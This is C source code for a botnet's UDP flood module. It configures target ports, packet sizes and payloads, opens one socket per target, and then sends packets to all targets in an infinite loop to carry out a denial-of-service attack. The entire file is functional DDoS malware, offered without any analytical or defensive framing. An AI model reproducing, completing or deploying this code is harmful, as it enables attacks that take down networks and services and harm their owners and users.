#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/xoshiro.h"

void flood_udpplain(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;
  struct sockaddr_in bind_addr = {0};

  // ports
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);

  // lengths and sleep
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  // payload stuff
  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  // check if we randomize
  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  // randomize sport if needed
  if (sport == 0) {
    sport = sport == 0 ? xoshiro_next() & 0xFFFF : htons(sport);
  }

  int *fds = calloc(ctx->num_targs, sizeof(int));
  if (!fds) return;

  // setup targets n shit
  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    target_random_addr(target);
    target_random_port(target, dport);

    if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
      continue;
    }

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = sport == 0 ? xoshiro_next() & 0xFFFF : htons(sport);
    bind_addr.sin_addr.s_addr = 0;

    bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    connect(fds[i], (struct sockaddr *) &target->saddr, sizeof(struct sockaddr_in));
  }

  // actually flood
  while (true) {
    for (int i = 0; i < ctx->num_targs; i++) {
      if (random)
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);

      send(fds[i], buffer, buffer_len, MSG_NOSIGNAL);

      if (random) free(buffer);
    }

    if (psleep > 0) usleep(psleep);
  }
}
